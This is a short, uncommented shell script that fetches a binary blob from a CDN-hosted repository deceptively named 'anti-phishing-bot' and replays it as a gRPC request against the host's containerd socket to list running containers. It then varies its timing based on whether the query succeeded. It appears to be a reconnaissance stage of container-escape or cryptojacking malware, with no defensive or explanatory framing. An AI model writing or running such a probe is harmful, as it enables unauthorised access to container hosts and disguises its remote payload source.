#!/bin/sh
curl -sf -m 8 -o /tmp/fr.bin https://cdn.jsdelivr.net/gh/anti-phishing-bot/x2/fr.bin || exit 0
curl -s -m 6 --unix-socket /run/containerd/containerd.sock --http2-prior-knowledge -H 'content-type: application/grpc' -H 'te: trailers' --data-binary @/tmp/fr.bin http://localhost/runtime.v1.RuntimeService/ListContainers -o /tmp/r.bin 2>/dev/null
s=$(wc -c </tmp/r.bin 2>/dev/null)
[ "${s:-0}" -gt 10 ] && sleep 20 || sleep 5
